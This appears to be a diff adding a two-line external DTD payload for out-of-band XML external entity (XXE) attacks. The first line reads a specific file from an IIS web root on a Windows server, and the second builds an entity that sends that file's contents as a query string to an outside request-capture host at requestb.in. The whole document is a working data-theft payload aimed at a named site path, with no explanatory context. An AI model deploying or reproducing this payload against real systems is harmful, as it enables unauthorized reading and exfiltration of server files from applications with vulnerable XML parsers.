@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file://c:\inetpub\wwwroot\Expo_SolidLab\WebSite\Areas\MatchMaking\Views\Admin\Import.cshtml">
+<!ENTITY % param1 "<!ENTITY &#x25; exfil SYSTEM 'http://requestb.in/19k0sh21?a=%data;'>">
